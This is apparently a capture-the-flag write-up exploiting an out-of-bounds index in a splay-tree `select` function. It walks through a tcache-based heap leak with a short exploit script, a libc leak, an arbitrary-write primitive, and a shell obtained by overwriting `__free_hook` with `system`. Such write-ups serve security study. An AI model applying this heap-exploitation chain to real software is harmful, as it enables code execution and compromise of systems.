# The bug

The bug is a very obvious OOB that exists in the `select` function.

```
unsigned long select(sp *tree, int idx)
{
  struct node *e;

  e = tree->vector[idx];                          // OOB
  sp_select(tree, &e->tree_metadata);
  return e->y;
}
```

Basically, the `select` function takes the idx'th element from the vector and places it on top of the tree. By faking a node on a tree we can manipulate the entire tree structure.

# Heap Leak

Each node looks like this:

```
struct node {
	unsigned long x;
	unsigned long y;
	unsigned long unk1;
	unsigned long unk2;
	unsigned long idx;

	struct tree_metadata {
		struct tree_metadata *parent;
		struct tree_metadata *lchild;
		struct tree_metadata *rchild;
		unsigned long size;
	} meta;
};
```
And by using the given features we can get the contents of x and y in the nodes. This can be used for an infoleak. However, in order to fake a node we need to store a pointer pointing to it. I did this by using the freed chunks of `tcache`. In each freed chunk of tcache there is a pointer pointing to its `prev` chunk. By using this, we can get the `x` value of a freed chunk faked to a node, which is a heap address.


```
for i in range(5):
		add(i,i)

	delete(0)
	delete(1)
	delete(2)
	delete(3)
	delete(4)

	idx = (0x7fc6681fc370 - 0x7fc6681fb260)//8

	select(idx)
	HEAP = getnth(0)

	log.info("HEAP: 0x%x"%HEAP) # 0x7f68373c72d0
```

# LIBC Leak and arbitrary write

After a long time of thinking, I decided to use a section of memory that has lots of NULLs but also contains some important pointers. It is important that the section has an abundance of NULLs so that the `select` function does not attempt to recurse to its parent or children. The ideal memory section that I thought of was the tcache structure, located in the heap base. 

```
void find_and_add(struct sp *tree, unsigned long incr, unsigned long x, unsigned long y)
{

  struct node *node = sp_isolate(tree, x, y);
  if ( node )
    *(_QWORD *)(node - 0x18) += a2;
}
```

By using this functionality, we can get a write primitive. By overwriting the tcache head to a pointer we can get a node allocated at an unsorted bin, and when we get the `x` value of it we get a libc address. 

# Getting a shell

Afterwards everything is easy, we can use the primitives discussed to get arbitrary write, overwriting `__free__hook` with `system` and calling `free("/bin/sh")`